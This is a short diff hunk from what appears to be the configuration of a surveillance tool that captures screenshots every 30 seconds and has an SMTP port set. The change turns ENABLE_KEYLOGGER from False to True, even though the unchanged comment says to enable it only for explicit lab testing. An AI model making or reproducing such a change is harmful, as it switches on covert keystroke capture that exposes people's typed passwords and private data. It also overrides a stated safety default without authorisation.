@@ -24,7 +24,7 @@ SMTP_PORT = 465
 # -------------------------
 # Safety Switches
 # -------------------------
-ENABLE_KEYLOGGER = False # <-- set to True only if explicitly testing in lab
+ENABLE_KEYLOGGER = True # <-- set to True only if explicitly testing in lab
 ENABLE_SCREENSHOTS = True
 SCREENSHOT_INTERVAL = 30  # seconds
 
